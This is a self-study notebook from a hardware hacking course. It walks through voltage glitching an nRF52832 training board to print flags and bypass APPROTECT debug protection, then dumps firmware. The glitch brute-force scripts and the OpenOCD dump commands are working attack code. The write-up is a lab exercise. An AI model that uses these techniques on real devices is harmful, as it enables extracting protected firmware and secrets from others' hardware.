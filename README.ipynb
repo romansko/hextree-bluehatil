{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "72605c5b-3b18-4796-a28a-b06ec2d47533",
   "metadata": {},
   "source": [
    "_**This notebook is written for self learning purposes and based on Hextree's Hardware Hacking courses: https://app.hextree.io/map/hardware-hacking.**_"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4a555a16-0523-42ed-89cc-cab46052629e",
   "metadata": {},
   "source": [
    "# Contents\n",
    "\n",
    "* [Voltage Fault Injection - brief](#Voltage-Fault-Injection)\n",
    "* [Required Hardware](#Required-Hardware)\n",
    "* [The Faultier](#The-Faultier)\n",
    "    * [Programming The Faultier](#Programming-the-Faultier)\n",
    "    * [Faultier Python Installation](#Faultier-Python-Installation)\n",
    "    * [Installing OpenOCD](#Installing-OpenOCD)\n",
    "* [GlitchTag](#GlitchTag)\n",
    "    * [Programming The GlitchTag](#Programming-the-GlitchTag)\n",
    "    * [1_glitchtag_simple_target.hex](#1_glitchtag_simple_target.hex)\n",
    "    * [GlitchTag connection setup](#GlitchTag-connection-setup)\n",
    "* [Glitching](#Glitching)\n",
    "* [nRF52's APPROTECT](#nRF52's-APPROTECT)\n",
    "    * [approtect_flag.hex](#approtect_flag.hex)\n",
    "    * [Power Analysis](#Power-Analysis)\n",
    "    * [Performing the attack](#Performing-the-attack)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "id": "7763f88c-ce7e-40ab-b7fd-81ac4f8fb925",
   "metadata": {},
   "source": [
    "# Voltage Fault Injection\n",
    "\n",
    "Voltage Fault Injection (aka Voltage Glitching) is dropping the supply voltage towards the chip for a very short of time at a very precise moment. \n",
    "\n",
    "<img alt=\"hextree\" src=\"./Resources/glitch_graph.png\" width=\"30%\">\n",
    "\n",
    "By doing this attack, we will cause an **undefined behaviour** on the chip (Crash, Memory Corruption, Instruction skipping).\n",
    "\n",
    "<u>Example</u>: Password check bypass\n",
    "\n",
    "```c\n",
    "int pw_valid = check_password();\n",
    "if (pw_valid) {\n",
    "    printf(\"Password is valid\");\n",
    "}\n",
    "```\n",
    "\n",
    "The function `check_password` will return `0` if the password is invalid, and then the string will not be printed.\n",
    "\n",
    "However, if we will manage to flip a single bit in the `pw_valid` vairable stack, the `if (pw_valid)` statement will pass because any non-zero value means `true`. The timing of the voltage drop should be while the processor checks the value of `pw_valid`.\n",
    "\n",
    "Voltage Glitching required the following parameters:\n",
    "\n",
    "* **Pulse Length** - The duration of the dropped voltage.\n",
    "* **Delay** - Determines where in time we will insert our glitch.\n",
    "* **Trigger** - The point in time to start the delay from.\n",
    "\n",
    "<img alt=\"hextree\" src=\"./Resources/params.png\" width=\"30%\">\n",
    "\n",
    "For advanced glitching, we might also want to control parameters such as the pulse strength or the pulse curve.\n",
    "\n",
    "<br />"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b2b2ab59-f9e4-4f96-9d23-aafc95e0a8a0",
   "metadata": {},
   "source": [
    "# Required Hardware\n",
    "\n",
    "Required hardware for [Hextree's Hardware Hacking course](https://app.hextree.io/map/hardware-hacking):\n",
    "\n",
    "|                                   |                                                   |\n",
    "| --------------------------------- | ------------------------------------------------- |\n",
    "| **Hextree's Faultier**            | <img src=\"./Resources/faultier.jpg\"  width=\"20%\"> |\n",
    "| **Hextree's GlitchTag**           | <img src=\"./Resources/glitchtag.png\" width=\"20%\"> |\n",
    "| **Socket-to-socket jumper wires** | <img src=\"./Resources/wires.jpg\"     width=\"20%\"> |\n",
    "| **microusb to usb cable**         | <img src=\"./Resources/microusb.jpg\"  width=\"20%\"> |\n",
    "| **Jumpers (x2)**                  | <img src=\"./Resources/jumpers.jpg\"   width=\"20%\"> |\n",
    "\n",
    "The GlitchTag & Faultier can be purchased from hextree. See [Hextree's course intro](https://app.hextree.io/courses/fault-injection-introduction/fault-injection-theory/introduction-Xs)."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "38f740bb-9f51-4bed-b925-729a882ec126",
   "metadata": {},
   "source": [
    "# The Faultier\n",
    "\n",
    "The Hextree Faultier is used to perform voltage fault-injection attacks, required by Hextree fault-injection courses.\n",
    "\n",
    "<img src=\"./Resources/faultier.jpg\" width=\"30%\">\n",
    "\n",
    "**Features:**\n",
    "\n",
    "* Raspberry Pi Pico or RP2040 based.\n",
    "* 200MHz (5ns) glitch resolution.\n",
    "* 4 SMA Connectors (Right side) usually used for measurement equipment such as oscilloscope.\n",
    "    * `Crowbar` - Connected to n-Channel MOSFET's Drain while the Source is connected to ground. The Gate is controlled by the Raspberry Pi.\n",
    "    * `MUX0` - Connected to `MUX0` Inputs 0/1, controlled by 2-channel analogue switch for dipping voltage or re-powering targets (in our case, with jumpers).\n",
    "    * `EXT0` - Exposing one of the Raspberry's Digital IO. Can be used for trigger input or external reset.\n",
    "    * `EXT1` - Exposing one of the Raspberry's IO, but supports ADC. Can be used for analog measurement.\n",
    "    * The `Crowbar`, `MUX0` and the `EXT1` are connected to different ADC channels.\n",
    "* LEDs for indications such as the `CB` LED which will indicate whether the Crowbar gate is active\n",
    "* Python control library.\n",
    "\n",
    "* An 20 pins connector:\n",
    "\n",
    "<img src=\"./Resources/20pin.png\" width=\"30%\">\n",
    "\n",
    "* `IO3`, `IO4` are used as USB to UART convertor.\n",
    "    * `IO3` is used as Tx allowing to transmit UART.\n",
    "    * `IO4` is used as Rx allowing to receive UART from the host device.\n",
    "\n",
    "* Integrated SWD probe which can be used to program or to debug external target.\n",
    "\n",
    "<img src=\"./Resources/swd.png\" width=\"30%\">\n",
    "\n",
    "For more information, refer to [Hextree's Hardware Hacking course](https://app.hextree.io/map/hardware-hacking) "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "054964d8-47ac-4740-82b0-b8bd247c2393",
   "metadata": {},
   "source": [
    "## Programming the Faultier\n",
    "\n",
    "The Faultier firmware is available on [Hextree's github](https://github.com/hextreeio/faultier/releases). The current usded firmware is [v0.1.32](./resources/RPI-RP2/faultier.uf2).\n",
    "\n",
    "To install, it's required to hold RaspberryPi `BOOTSEL` button while plugging in the device. It should show up as a mass storage device which the `faultier.uf2` should be copied to. After copying the firmware, the device should restart with the installed firmware."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "113562b5-a960-4da5-ab15-072d5735efd2",
   "metadata": {},
   "source": [
    "## Faultier Python Installation\n",
    "\n",
    "To interact with the Faultier board, it's required to install Faultier python framework. It's recommended to install within [virtual environment](https://docs.python.org/3/library/venv.html).\n",
    "\n",
    "Installation command: `pip install faultier`\n",
    "\n",
    "The Faultier python framework comes with a basic wrapper around OpenOCD which can allow us to program target firmwares.\n",
    "\n",
    "Link - [Faultier Python Framework](https://github.com/hextreeio/faultier-python)\n",
    "\n",
    "Checking Faultier package installed version:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "17367962-58e5-4f37-9a0d-2de6d7e610f0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "faultier==0.1.42\n"
     ]
    }
   ],
   "source": [
    "!pip freeze | grep faultier"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "09e71b53-aff7-496a-a9ab-13745fa19641",
   "metadata": {},
   "source": [
    "Checking connection to the Faultier board:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "3671a5ba-b67c-431d-80a7-82e6cd9ac7b6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Connected to Faultier on COM3\n"
     ]
    }
   ],
   "source": [
    "import faultier\n",
    "ft = faultier.Faultier() # Connected Faultier board is required!\n",
    "print(f\"Connected to Faultier on {ft.get_serial_path()}\")\n",
    "ft.device.close() # To allow re-opening COM port."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "24c9fb68-cfbe-48f0-aba8-db2cab4508e7",
   "metadata": {},
   "source": [
    "## Installing OpenOCD\n",
    "\n",
    "[OpenOCD](https://openocd.org/) (open source On-Chip debugger) can be used to program a firmware onto an external microcontroller or to debug it. The Faultier includes a program header which is used for that purpose. It's imporant to use Hextree's forked version. For windows, it's possible to use [Hextree's prebuilt](https://github.com/stacksmashing/openocd-tamarin/releases/tag/latest). For other OS, see [Hextree's openocd installation guide](https://app.hextree.io/courses/fault-injection-introduction/the-faultier/installing-openocd).\n",
    "\n",
    "For convenience, add `openocd\\bin` to path. Checking `openocd` version:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "7ff5df2d-b551-4183-8546-05510de37020",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Open On-Chip Debugger 0.12.0-ga058334 (2024-09-28-16:29) [https://github.com/stacksmashing/openocd-tamarin]\n",
      "Licensed under GNU GPL v2\n",
      "For bug reports, read\n",
      "\thttp://openocd.org/doc/doxygen/bugs.html\n"
     ]
    }
   ],
   "source": [
    "!openocd --version"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a206baae-ab8e-40ac-99b0-dd88176aa4dc",
   "metadata": {},
   "source": [
    "# GlitchTag\n",
    "\n",
    "The Hextree's **GlitchTag** contains nRF52832 microcontroller, and it will be our target for glitching.\n",
    "\n",
    "We would like to only glitch the cpu core and not the entire board. Hence, specifically for the nRF52832, we can connect on the line of the decoupling capacitor, which is connected to the cpu core.\n",
    "\n",
    "<img src=\"./Resources/nRF52832.png\" width=\"30%\">\n",
    "\n",
    "Hextree removed the capacitor and made a connector for simplicity `Glitch Here` in the GlitchTag, giving a direct connection to the core's voltage.\n",
    "\n",
    "<img src=\"./Resources/glitchtag_glitch_here.png\" width=\"30%\">\n",
    "\n",
    "If we were connected to the Power Supply (`VDD`), we could put a switch which would regulate the power supply for the cpu core. Instead, we are connected to the decoupling capacitor line. So the solution would be to put a switch on that line which is connected to ground (`GND`). Upon activating the switch, the voltage on the cpu would drop. This is risky action because short circuiting the chip might damage it. However, specifically the nRF52832 seems to endure it.\n",
    "\n",
    "Instead of a mechanical switch, we would like an electrical switch, in order to control switching in the resolution of nano-seconds. **n-Channel MOSFET** is used in this application. **Hextree implemented the entire Crowbar glitching circuit on the Faultier.**"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1f77c66d-8091-4567-a5a0-0b5630f1fdf9",
   "metadata": {},
   "source": [
    "## Programming The GlitchTag\n",
    "\n",
    "To program a firmware to the GlitchTag, first we need to connect the `SWD` interface between the Faultier and the GlitchTag, **Powered off** while connection. \n",
    "* `program` is printed on the boards interfaces.\n",
    "* **The orientation is important.**\n",
    "\n",
    "<img src=\"./Resources/program.jpg\" width=\"30%\">\n",
    "\n",
    "After connection the Faultier to the host, it's possible to use Hextree's python framwork to program [`1_glitchtag_simple_target.hex`](./resources/1_glitchtag_simple_target.hex) onto the GlitchTag.\n",
    "\n",
    "```python\n",
    "import faultier\n",
    "faultier.Faultier.flash_nrf(\"./resources/1_glitchtag_simple_target.hex\")\n",
    "```\n",
    "\n",
    "However, I received errors when trying to program:\n",
    "\n",
    "```\n",
    "Flashing nRF...\n",
    "Error during flashing process: Command '['openocd', '-f', 'interface/tamarin.cfg', '-f', 'target/nrf52.cfg', '-c', 'init; nrf52_recover; program ./resources/1_glitchtag_simple_target.hex verify; reset; exit']' returned non-zero exit status 1.\n",
    "Output: \n",
    "Errors: Open On-Chip Debugger 0.12.0-ga058334 (2024-09-28-16:29) [https://github.com/stacksmashing/openocd-tamarin]\n",
    "Licensed under GNU GPL v2\n",
    "For bug reports, read\n",
    "\thttp://openocd.org/doc/doxygen/bugs.html\n",
    "DEPRECATED! use 'adapter driver' not 'interface'\n",
    "Info : only one transport option; autoselect 'swd'\n",
    "Warn : Transport \"swd\" was already selected\n",
    "DEPRECATED! use 'adapter speed' not 'adapter_khz'\n",
    "adapter speed: 2000 kHz\n",
    "\n",
    "Error: libusb_open() failed with LIBUSB_ERROR_NOT_FOUND\n",
    "Error: Failed to open or find the device\n",
    "Error: Can't find a tamarin device! Please check device connections and permissions.\n",
    "```\n",
    "\n",
    "**To set the driver on Windows, [zadig](https://zadig.akeo.ie/) is used to set:**\n",
    "\n",
    "* `Faultier (interface 2)` to `libusb0` \n",
    "* `Tamarin CDC (interface 0)` to `libusbk`.\n",
    "\n",
    "However I only installed `WinUSB` driver for the `Faultier` meanwhile.\n",
    "\n",
    "<img src=\"./Resources/zadig.png\" width=\"50%\">\n",
    "\n",
    "After the driver install, the programming went well and the output after running `faultier.Faultier.flash_nrf(\"./resources/1_glitchtag_simple_target.hex\")` was:\n",
    "\n",
    "```\n",
    "Flashing nRF...\n",
    "Flashing successful: Verified OK\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "316ba11e-1cee-4b79-a81e-5ca6b473127b",
   "metadata": {},
   "source": [
    "## 1_glitchtag_simple_target.hex\n",
    "\n",
    "The [`1_glitchtag_simple_target.hex`](./resources/1_glitchtag_simple_target.hex) firmware was written by Hextree. The purpose is to extract the `HXT{..}` flag from the firmware with glitching. The firmware configures the GlitchTag's `GPIO 0` to be UArt Tx which is used to check if the glitch was successful. `GPIO 2` is configured as outout which is used as trigger for timing the glitch.\n",
    "\n",
    "The firmware's code:\n",
    "\n",
    "```c\n",
    "/* Written by HexTree */\n",
    "#define LOOP_LENGTH 100\n",
    "void glitch_target() {\n",
    "    // R - Indicates that the device reset\n",
    "    print_uart(\"R\");\n",
    "\n",
    "    // Generate a short trigger signal on IO 2\n",
    "    // Pulse: ___|--|__________\n",
    "    gpio_pin_set_dt(&trigger, 1);\n",
    "    k_msleep(10);\n",
    "    gpio_pin_set_dt(&trigger, 0);\n",
    "\n",
    "    uint32_t cnt = 0, i, j;\n",
    "    for (i = 0; i < LOOP_LENGTH; i++) {\n",
    "        for (j = 0; j < LOOP_LENGTH; j++) {\n",
    "            cnt++;\n",
    "        }\n",
    "    }\n",
    "\n",
    "    if (i != LOOP_LENGTH || j != LOOP_LENGTH || cnt != (LOOP_LENGTH * LOOP_LENGTH)) {\n",
    "        // X = Success!\n",
    "        print_uart(\"X\");\n",
    "        print_uart(\"HXT{...}\");\n",
    "    } else {\n",
    "        // N = Normal execution\n",
    "        print_uart(\"N\");\n",
    "    }\n",
    "\n",
    "    // Endless loop\n",
    "    while(1) {}\n",
    "}\n",
    "```\n",
    "\n",
    "**With glitching, we want to break the deterministic loop resulting in printing the `HXT{...}` flag.**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "06065ef2-3042-42dc-8d34-0577e0f9ae7d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HXT{glitching-the-nRF-is-easy}\n"
     ]
    }
   ],
   "source": [
    "# Cheating xD\n",
    "!objcopy --input-target=ihex --output-target=binary .\\resources\\1_glitchtag_simple_target.hex .\\resources\\1_glitchtag_simple_target.bin\n",
    "!strings .\\resources\\1_glitchtag_simple_target.bin | grep HXT"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "24a68879-e3ec-4550-95b4-f43d0218b667",
   "metadata": {},
   "source": [
    "## GlitchTag connection setup\n",
    "\n",
    "* For power switching the GlitchTag:\n",
    "    * Jumper on the Faultier `MUX0_Input0` <-> `3.3v`\n",
    "    * Jumper on the Faultier `MUX0_Input1` <-> `GND`\n",
    "    * GlitchTag `VCC` is connected to Faultier `MUX0`\n",
    "    * GlitchTag `GND` is connected to Faultier `MUX0 GND`\n",
    "* For receiving serial data which will indicate if the glitch was successful:\n",
    "    * GlitchTag `GPIO0` is connected to Faultier UArt Input (20Pin Connector - 3rd Pin from left, bottom row) \n",
    "* For the glitch trigger, GlitchTag `GPIO2` is connected to Faultier `EXT0`+\n",
    "* For Crowbar Glitching, GlitchTag `Glitch Here` is connected to `Crowbar`, which is connected to `MOSFET`.\n",
    "When the MOSFET gets activated, it creates a short circuit by briefly connecting the chips power-supply directly to GND.\n",
    "\n",
    "<img src=\"./Resources/glitch_setup.jpg\" width=\"50%\">\n",
    "\n",
    "After all set, the Faultier is connected to the Host PC with the `microUSB` connector."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3adb5548-ab40-4ad8-8c7d-4f3bc534f413",
   "metadata": {},
   "source": [
    "## Glitching"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "a2bb2e4d-d391-4bc2-9d05-d6746ad61347",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Sanity Check - If no errors occurred, it's fine to proceed.\n",
    "import faultier\n",
    "import serial\n",
    "ft = faultier.Faultier()\n",
    "ser = serial.Serial(ft.get_serial_path(), baudrate=115200)\n",
    "ser.timeout = 0.3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "e971f070-a4cd-461c-acb0-2c20e3c6a071",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Configure the glitcher\n",
    "ft.configure_glitcher(\n",
    "    # Every time we call the power_cycle function or the glitch function, it should switch MUX0 to GND and then back to +3.3v\n",
    "    power_cycle_output = faultier.OUT_MUX0,\n",
    "    power_cycle_length = 300000,  # 5 nanoseconds increments\n",
    "    trigger_source = faultier.TRIGGER_IN_EXT0,\n",
    "    trigger_type = faultier.TRIGGER_PULSE_POSITIVE,  # The GlitchTag creates a positive pulse on the trigger pin.\n",
    "    glitch_output = faultier.OUT_CROWBAR\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "5ebb0ff6-5fbb-421f-bc1b-90ea20de5767",
   "metadata": {},
   "outputs": [],
   "source": [
    "# helper function\n",
    "def glitch(d, p):\n",
    "    # Flush serial data\n",
    "    if ser.in_waiting:   \n",
    "        ser.read(ser.in_waiting)\n",
    "    ft.glitch(delay=d, pulse=p)\n",
    "    data = ser.read(3)   # 3 bytes expected 0, R, X or N\n",
    "    if b\"X\" in data:\n",
    "        print(f\"Success! Delay: {d} Pulse: {p}\")\n",
    "        print(ser.read(50))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "6e068973-b0f5-4b1b-ae09-56fff136fe70",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Success! Delay: 238 Pulse: 7\n",
      "b'RN'\n",
      "Success! Delay: 239 Pulse: 9\n",
      "b'HXT{glitching-the-nRF-is-easy}'\n",
      "Success! Delay: 247 Pulse: 7\n",
      "b'T{glitching-th\\x00RN'\n",
      "Success! Delay: 247 Pulse: 9\n",
      "b'HXT{glitching-the-nRF-is-easy}'\n",
      "Success! Delay: 254 Pulse: 8\n",
      "b'HXT{glitching-the-nRF-is-easy}'\n",
      "Success! Delay: 263 Pulse: 9\n",
      "b'HXT{glitching-the-nRF-is-easy}'\n",
      "Success! Delay: 264 Pulse: 7\n",
      "b'HXT{glitching-the-nRF-is-easy}'\n",
      "Success! Delay: 265 Pulse: 9\n",
      "b'glitching-the-nRF-is-easy}\\x00RXHXT{glitching-the-nRF'\n",
      "Success! Delay: 268 Pulse: 6\n",
      "b'T{glitching-the-nRF-is-ea\\x00RXHXT{glitching-the-nRF-'\n",
      "Success! Delay: 269 Pulse: 9\n",
      "b'glitching-the-nRF-is-easy}\\x00R\\x00RN'\n",
      "Success! Delay: 270 Pulse: 5\n",
      "b'HXT{glitching-the-nRF-is-easy}'\n",
      "Success! Delay: 271 Pulse: 5\n",
      "b'HXT{glitching-the-nRF-is-easy}'\n",
      "Success! Delay: 271 Pulse: 6\n",
      "b'HXT{glitching-the-nRF-is-easy}'\n",
      "Success! Delay: 273 Pulse: 5\n",
      "b'glitching-the-nRF-is-easy}\\x00RXHXT{glitching-the-nRF'\n",
      "Success! Delay: 275 Pulse: 9\n",
      "b'HXT{glitching-the-nRF-is-easy}'\n",
      "Success! Delay: 283 Pulse: 8\n",
      "b'T{glitching-the-\\x0e\\x00R\\x00RN'\n",
      "Success! Delay: 293 Pulse: 6\n",
      "b'T{glitching-the-nRF-is-e\\x00RN'\n"
     ]
    }
   ],
   "source": [
    "# Glitching brute-force\n",
    "for d in range(200, 300):  #  range(0, 100000):\n",
    "    for p in range(5, 10):  # range(0, 10):\n",
    "        glitch(d, p)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "9f3f5920-ea6a-4925-b17a-ee54925559c3",
   "metadata": {},
   "outputs": [],
   "source": [
    "# cleanup\n",
    "ser.close()\n",
    "ft.device.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cb0b9d89-fb6c-4375-bb0c-b84a583bf5a8",
   "metadata": {},
   "source": [
    "# nRF52's APPROTECT\n",
    "\n",
    "The purpose of this course is to bypass the nRF52's APPROTECT (Access Port Protection), using voltage glitching, in order to dump the firmware.\n",
    "\n",
    "**Links**\n",
    "\n",
    "* LimitedResult's research:\n",
    "    * [nRF52 Debug Resurrection (APPROTECT Bypass) Part 1](https://limitedresults.com/2020/06/nrf52-debug-resurrection-approtect-bypass)\n",
    "    * [nRF52 Debug Resurrection (APPROTECT Bypass) Part 2](https://limitedresults.com/2020/06/nrf52-debug-resurrection-approtect-bypass-part-2)\n",
    "* [nRF52832 Datasheets](https://docs.nordicsemi.com/bundle/ps_nrf52832/page/nrf52832_ps.html)\n",
    "\n",
    "**Locking & Unlocking**\n",
    "\n",
    "`SWD` connection is required.\n",
    "\n",
    "<img src=\"./Resources/program.jpg\" width=\"30%\">\n",
    "\n",
    "The [`UICR` registers](./resources/nRF52832_PS_v1.7.pdf#page=55) (User information configuration registers) are non-volatile memory (NVM) registers for configuring user specific settings. The important information is that the `UICR` are at the base address of `0x10001000`.\n",
    "\n",
    "The [`APPROTECT` register](./resources/nRF52832_PS_v1.7.pdf#page=68) is at offset `0x208`\n",
    "\n",
    "using openocd & telnet connecting to target, we can write the following command to lock the chip:\n",
    "\n",
    "```\n",
    "flash fillw 0x10001208 0xFFFFFF00 0x01\n",
    "```\n",
    "\n",
    "Hextree wrapped the commands of openocd for locking and unlocking inside the faultier python package."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "8cda23c4-213b-4352-b093-f4266343ce17",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Locking nRF...\n",
      "Chip locked!\n",
      "Unlocking nRF...\n",
      "Chip unlocked!\n"
     ]
    }
   ],
   "source": [
    "import faultier\n",
    "faultier.Faultier.lock_nrf()\n",
    "faultier.Faultier.unlock_nrf()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "77a3b3cf-faa6-4c87-8eaf-8b700f6d180e",
   "metadata": {},
   "source": [
    "## approtect_flag.hex"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "6710f5ab-0e9d-4941-a073-d75aa5b818b7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HXT{APPROTECT-can-be-bypassed}\n"
     ]
    }
   ],
   "source": [
    "# Cheating again\n",
    "!objcopy --input-target=ihex --output-target=binary .\\resources\\approtect_flag.hex .\\resources\\approtect_flag.bin\n",
    "!strings .\\resources\\approtect_flag.bin | grep HXT"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bb2dcd24-a1e2-496c-a4da-55e2a4048478",
   "metadata": {},
   "source": [
    "**Setup:**\n",
    "\n",
    "<img src=\"./Resources/power_setup.png\" width=\"50%\">"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "0e2548fe-73e4-418b-854e-d444bb61aaf9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Flashing nRF...\n",
      "Flashing successful: Verified OK\n"
     ]
    }
   ],
   "source": [
    "# Flashing approtect_flag.hex\n",
    "import faultier\n",
    "faultier.Faultier.lock_and_flash_nrf(\"./resources/approtect_flag.hex\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fafdccd9-ce3b-45ea-bfc6-2925d270d8af",
   "metadata": {},
   "source": [
    "## Power Analysis"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "63ead48d-025f-4849-823b-a687da6c3384",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[<matplotlib.lines.Line2D at 0x1a64992b6e0>]"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import faultier\n",
    "import matplotlib.pyplot as plt\n",
    "import numpy as np  # for linspace\n",
    "ft = faultier.Faultier()\n",
    "\n",
    "ft.configure_adc(faultier.ADC_CROWBAR, 6000)\n",
    "ft.configure_glitcher(\n",
    "    power_cycle_output = faultier.OUT_MUX0,\n",
    "    power_cycle_length = 300000\n",
    ")\n",
    "\n",
    "ft.glitch()\n",
    "values = ft.read_adc()\n",
    "ft.device.close()\n",
    "\n",
    "plt.plot(values)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b7f039d6-f133-460a-b903-e5bc53768440",
   "metadata": {},
   "source": [
    "The power drop is around 2500. 1 ADC measurement takes 96 CPU cycles. Hence we need to multiply: $2500 \\times 96 = 240000$ cycles which will be our glitch delay."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7643fd7f-ff4d-429a-9221-60d32fed11f2",
   "metadata": {},
   "source": [
    "## Performing the attack\n",
    "\n",
    "**Glitching Strategy**\n",
    "\n",
    "<img src=\"./Resources/strategy.png\" width=\"50%\">\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "09e05a6b-93c7-4313-bf35-dc1b3c34654c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Success 232655 76\n",
      "You can now connect to the chip using OpenOCD!\n"
     ]
    }
   ],
   "source": [
    "import faultier\n",
    "import random\n",
    "\n",
    "ft = faultier.Faultier()\n",
    "ft.configure_glitcher(\n",
    "    glitch_output = faultier.OUT_CROWBAR,\n",
    "    power_cycle_output = faultier.OUT_MUX0,\n",
    "    power_cycle_length = 300000\n",
    ")\n",
    "delay = 2500 # Measured delay\n",
    "delay_start = (delay - 100) * 96\n",
    "delay_end = (delay + 100) * 96\n",
    "\n",
    "while True:\n",
    "    d = random.randint(delay_start, delay_end)\n",
    "    p = random.randint(40, 80)\n",
    "    ft.glitch(delay = d, pulse = p)\n",
    "    if(ft.nrf52_check()):\n",
    "        print(f\"Success {d} {p}\")\n",
    "        print(\"You can now connect to the chip using OpenOCD!\")\n",
    "        break\n",
    "ft.device.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6a76ca04-77d0-495f-8784-8b1a1fd89b86",
   "metadata": {},
   "source": [
    "**Note for Windows users**: To set the driver use Zadig to set the driver for \"Faultier (interface 2)\" to libusb0 and \"Tamarin CDC (interface 0)\" to libusbk."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "7bba2a2f-0293-4f19-be71-7307e8bcac6b",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Open On-Chip Debugger 0.12.0-ga058334 (2024-09-28-16:29) [https://github.com/stacksmashing/openocd-tamarin]\n",
      "Licensed under GNU GPL v2\n",
      "For bug reports, read\n",
      "\thttp://openocd.org/doc/doxygen/bugs.html\n",
      "DEPRECATED! use 'adapter driver' not 'interface'\n",
      "Info : only one transport option; autoselect 'swd'\n",
      "Warn : Transport \"swd\" was already selected\n",
      "DEPRECATED! use 'adapter speed' not 'adapter_khz'\n",
      "adapter speed: 2000 kHz\n",
      "\n",
      "Info : clock speed 1000 kHz\n",
      "Info : SWD DPIDR 0x2ba01477\n",
      "Info : [nrf52.cpu] Cortex-M4 r0p1 processor detected\n",
      "Info : [nrf52.cpu] target has 6 breakpoints, 4 watchpoints\n",
      "Info : starting gdb server for nrf52.cpu on 3333\n",
      "Info : Listening on port 3333 for gdb connections\n"
     ]
    }
   ],
   "source": [
    "# Dump 30 bytes from address 0x55e1 to dump.bin\n",
    "!openocd -f interface/faultier.cfg -f target/nrf52.cfg -c \"init; dump_image dump.bin 0x55e1 30; exit\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "ab244db9-0940-4152-8db6-8c2f88380971",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HXT{APPROTECT-can-be-bypassed}\n"
     ]
    }
   ],
   "source": [
    "!strings dump.bin | grep HXT"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "15332838-55be-4f6f-9d1b-f71d7e4d0a7a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Setting of SWD frequency currently ignored.\n",
      "Probing 0\n",
      "Read ap 252\n",
      "IDR is: 611778577\n",
      "FOUND AP\n",
      "Probing 1\n",
      "Read ap 16777468\n",
      "IDR is: 42467328\n",
      "FOUND AP\n",
      "Probing 2\n",
      "Read ap 33554684\n",
      "IDR is: 0\n",
      "Probing 3\n",
      "Read ap 50331900\n",
      "IDR is: 0\n",
      "Probing 4\n",
      "Read ap 67109116\n",
      "IDR is: 0\n",
      "APs: {<APv1Address@0x28cda9bc140 #0 dp=0>: <AHB_AP@28cda923950 AHB-AP#0 idr=24770011 rom=e00ff000>, <APv1Address@0x28cdaab4140 #1 dp=0>: <AccessPort@28cda9bcbc0 AP#1 idr=02880000 rom=00000000>}\n",
      "000055e1:  48 58 54 7b  41 50 50 52  4f 54 45 43  54 2d 63 61    |HXT{APPROTECT-ca|\n",
      "000055f1:  6e 2d 62 65  2d 62 79 70  61 73 73 65  64 7d          |n-be-bypassed}|\n"
     ]
    }
   ],
   "source": [
